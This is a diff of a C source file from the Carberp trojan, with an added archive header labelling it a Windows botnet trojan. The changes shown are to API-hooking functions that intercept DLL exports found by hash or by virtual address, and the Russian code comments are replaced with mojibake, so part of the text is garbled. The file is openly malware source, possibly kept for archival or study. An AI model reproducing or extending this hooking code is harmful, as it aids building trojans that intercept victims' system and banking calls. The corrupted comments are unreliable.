@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 
 #include "Memory.h"
@@ -98,8 +109,8 @@ PVOID __HookApi( DWORD Dll, DWORD FuncAddr, DWORD ReplacementFunc )
 }
 
 /************************************************************************/
-//* Перехватывает экспортируемую функцию из dll,                       *//
-//  определяя её адрес по хешу 
+//* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ dll,                       *//
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ 
 PVOID HookApi( DWORD Dll, DWORD FuncHash, DWORD ReplacementFunc )
 {
 	DWORD FuncAddr = (DWORD)GetProcAddressEx( NULL, Dll, FuncHash );
@@ -107,11 +118,11 @@ PVOID HookApi( DWORD Dll, DWORD FuncHash, DWORD ReplacementFunc )
 }
 
 /************************************************************************/
-//* Перехватывает НЕэкспортируемую функцию из dll по её VA адресу,     *//
+//* пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ dll пїЅпїЅ пїЅ VA пїЅпїЅпїЅпїЅпїЅпїЅ,     *//
 PVOID HookApi2( DWORD Dll, DWORD FuncVA, DWORD ReplacementFunc )
 {
-	// Передаём в ф-ю 0, вместо хеша, это заставит её вернуть
-	// адрес загрузки самой dll
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅ-пїЅ 0, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ dll
 	DWORD FuncAddr = (DWORD)GetProcAddressEx( NULL, Dll, 0 );
 	if (FuncAddr)
 	{
